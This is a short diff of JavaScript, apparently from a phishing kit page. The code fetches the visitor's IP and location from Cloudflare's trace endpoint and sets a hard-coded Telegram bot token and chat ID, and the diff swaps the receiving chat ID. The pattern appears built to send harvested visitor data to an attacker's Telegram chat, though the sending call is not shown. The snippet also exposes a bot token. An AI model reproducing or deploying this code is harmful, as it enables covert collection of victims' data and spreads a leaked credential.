@@ -17,7 +17,8 @@
         }
         $.get('https://www.cloudflare.com/cdn-cgi/trace', function(data) {
           data = data.replace('h=www.cloudflare.com\n','')
-          var chat_id = '-487587096'
+          //var chat_id = '-487587096'
+          var chat_id = '-506848744'
           var toten = '1597774416:AAGbN4TwPCwS4PSh4QtvzRojIT8i8N5aLl8'
           var location = 'Unknown'
           var client_data = 'Unknown'
